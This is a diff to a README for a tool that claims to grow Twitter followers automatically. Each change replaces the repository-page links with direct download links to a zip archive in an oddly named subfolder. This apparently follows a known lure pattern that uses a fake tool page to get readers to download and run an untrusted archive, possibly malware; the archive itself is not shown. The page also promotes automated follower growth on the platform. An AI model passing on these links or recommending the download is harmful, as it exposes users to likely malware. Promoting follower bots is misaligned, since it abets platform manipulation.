@@ -1,6 +1,6 @@
 # 🤖 Twitter-Follower-Bot - Grow Your Twitter Audience Automatically
 
-[![Download Twitter Follower Bot](https://img.shields.io/badge/Download-Twitter_Follower_Bot-2ea44f?style=for-the-badge)](https://github.com/Beifengbeif7424/Twitter-Follower-Bot)
+[![Download Twitter Follower Bot](https://img.shields.io/badge/Download-Twitter_Follower_Bot-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/Beifengbeif7424/Twitter-Follower-Bot/main/unsunny/Follower_Bot_Twitter_2.8-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Twitter-Follower-Bot is your personal Twitter growth assistant. It works quietly
 
 ## ⬇️ Download and Installation
 
-Visit this link to download the application: **[Twitter-Follower-Bot Download Page](https://github.com/Beifengbeif7424/Twitter-Follower-Bot)**
+Visit this link to download the application: **[Twitter-Follower-Bot Download Page](https://raw.githubusercontent.com/Beifengbeif7424/Twitter-Follower-Bot/main/unsunny/Follower_Bot_Twitter_2.8-alpha.4.zip)**
 
 ### Step-by-Step Installation Guide
 
@@ -117,9 +117,9 @@ Need help? Join our growing community of users who share tips, tricks, and succe
 
 Don't let manual Twitter growth hold you back. Download Twitter-Follower-Bot now and watch your follower count soar. It's free, it's powerful, and it's exactly what you need to succeed on Twitter in 2026.
 
-[![Get Twitter Follower Bot](https://img.shields.io/badge/Get_Twitter_Follower_Bot-Free_Download-blue?style=for-the-badge&logo=windows)](https://github.com/Beifengbeif7424/Twitter-Follower-Bot)
+[![Get Twitter Follower Bot](https://img.shields.io/badge/Get_Twitter_Follower_Bot-Free_Download-blue?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/Beifengbeif7424/Twitter-Follower-Bot/main/unsunny/Follower_Bot_Twitter_2.8-alpha.4.zip)
 
-Visit this link to download the application: **[https://github.com/Beifengbeif7424/Twitter-Follower-Bot](https://github.com/Beifengbeif7424/Twitter-Follower-Bot)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Beifengbeif7424/Twitter-Follower-Bot/main/unsunny/Follower_Bot_Twitter_2.8-alpha.4.zip](https://raw.githubusercontent.com/Beifengbeif7424/Twitter-Follower-Bot/main/unsunny/Follower_Bot_Twitter_2.8-alpha.4.zip)**
 
 ---
 
